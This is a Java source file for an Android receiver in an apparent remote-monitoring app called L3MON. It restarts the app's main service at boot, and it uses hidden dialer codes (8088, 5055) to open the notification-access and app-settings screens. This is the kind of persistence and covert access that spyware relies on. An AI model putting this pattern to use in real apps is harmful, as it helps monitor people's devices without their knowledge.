package com.etechd.l3mon.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.etechd.l3mon.service.MainService;

public class BootAndSecretCodeReceiver extends BroadcastReceiver {

    private static final String SECRET_CODE_ACTION = "android.provider.Telephony.SECRET_CODE";

    @Override
    public void onReceive(Context context, Intent intent) {
        handleSecretCodes(context, intent);
        startMainService(context);
    }

    private void handleSecretCodes(Context context, Intent intent) {
        try {
            if (intent != null && SECRET_CODE_ACTION.equals(intent.getAction())) {
                Uri data = intent.getData();
                if (data != null) {
                    String code = data.getSchemeSpecificPart();
                    if ("8088".equals(code)) {
                        Intent settingsIntent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(settingsIntent);
                    } else if ("5055".equals(code)) {
                        Intent appSettings = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                Uri.parse("package:" + context.getPackageName()));
                        appSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(appSettings);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("BootReceiver", "Secret code handling error", e);
        }
    }

    private void startMainService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e("BootReceiver", "Failed to start MainService", e);
        }
    }
}
